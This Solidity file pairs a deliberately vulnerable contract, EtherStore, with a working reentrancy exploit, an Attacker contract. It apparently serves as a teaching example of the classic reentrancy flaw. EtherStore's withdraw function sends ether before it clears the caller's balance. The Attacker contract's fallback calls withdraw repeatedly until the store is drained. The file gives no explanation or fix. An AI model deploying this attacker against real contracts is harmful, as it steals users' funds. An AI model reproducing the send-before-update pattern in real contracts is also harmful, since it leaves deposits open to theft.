// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract EtherStore {
    mapping(address => uint) public balances;

    constructor() payable{}

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);
        (bool sent, ) = msg.sender.call{value:bal}("");
        require(sent, "failed to send");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}

contract Attacker {
    EtherStore store;

    constructor(address _store) payable {
        store = EtherStore(_store);
    }

    function deposit() public {
        store.deposit{value:1 ether}();
    }

    function attack() public {
        //require(msg.value > 1 ether);
        store.deposit{value: 1 ether}();
        store.withdraw();
    }

    fallback() external payable {
        if(address(store).balance >= 1 ether) {
            store.withdraw();
        }
    }
}